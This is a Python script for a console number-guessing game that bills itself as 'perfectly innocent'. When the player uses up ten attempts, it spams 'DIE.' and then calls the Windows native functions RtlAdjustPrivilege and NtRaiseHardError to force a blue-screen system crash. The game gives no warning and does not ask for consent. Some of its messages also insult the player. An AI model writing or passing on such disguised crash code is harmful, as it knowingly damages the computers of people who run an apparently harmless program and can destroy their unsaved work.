import random, sys, ctypes, time, re, os
class Colour:
	red     = "\033[0;31m"
	green   = "\033[0;32m"
	yellow  = "\033[0;93m"
	blue    = "\033[0;34m"
	reset   = "\033[0m"
def clearline(n):
	for _ in range(n):
		sys.stdout.write("\033[F")
		sys.stdout.write("\033[K")
def write(x):
	escape_sequence = re.compile(r'\033\[[0-9;]*m')
	i = 0
	while i < len(x):
		match = escape_sequence.match(x, i)
		if match:
			sys.stdout.write(match.group())
			sys.stdout.flush()
			i = match.end()
		else:
			if x[i] == "|": time.sleep(0.5)
			else: 
				sys.stdout.write(x[i])
				sys.stdout.flush()
				time.sleep(0.025)
			i += 1
	time.sleep(0.475)
	print()
write(f"{Colour.green}Welcome to my perfectly innocent number guessing game!{Colour.reset} :)")
time.sleep(1)
write(f"{Colour.green}You will have ten attempts to guess a number from 1 to 1000{Colour.reset}")
time.sleep(1)
write(f"{Colour.green}Press [Enter] to begin!{Colour.reset}")
input()
while 1:
	attempts = 10
	n = random.randint(1, 1000)
	while 1:
		if attempts > 7: write(f"{Colour.green}{attempts} attempts remaining!{Colour.reset}")
		elif attempts > 2: write(f"{Colour.yellow}Careful! |{attempts} attempts remaining!{Colour.reset}")
		elif attempts > 0: write(f"{Colour.red}!!!BEWARE!!! |{attempts} ATTEMPTS REMAINING!!!{Colour.reset}")
		elif attempts == 0:
			os.system('cls' if os.name == 'nt' else 'clear')
			print(f"{Colour.red}YOU HAVE RUN OUT OF ATTEMPTS.")
			time.sleep(2)
			clearline(1)
			print("NOW...")
			for _ in range(666): 
				for _ in range(13): print("DIE.", end=" ", flush=True)
				time.sleep(0.005)
			ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
			if not ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong())): write(f"{Colour.green}If you're seeing this,| you are the chosen one! {Colour.reset}|Or you're on a mac idk")
			else: write(f"{Colour.red}Nevermind you lucky bastard{Colour.reset}")
			quit()
		attempts -= 1
		guess = input(f"{Colour.blue}Guess: {Colour.reset}")
		if guess.isdigit():
			guess = int(guess)
			if guess == n:
				write(f"{Colour.green}Congratulations!| You won!{Colour.reset}")
				time.sleep(0.5)
				write(f"{Colour.blue}Press [Enter] to go again!{Colour.reset}| (or just quit the program, |I'm a script, |not your dad)")
				input()
				break
			elif guess < n: write(f"{Colour.blue}Higher!{Colour.reset}")
			elif guess > n: write(f"{Colour.blue}Lower!{Colour.reset}")
		else: write(f"{Colour.yellow}That's not a number, |but I'm still taking an attempt away because I don't like stupid people like you.{Colour.reset}")
#nice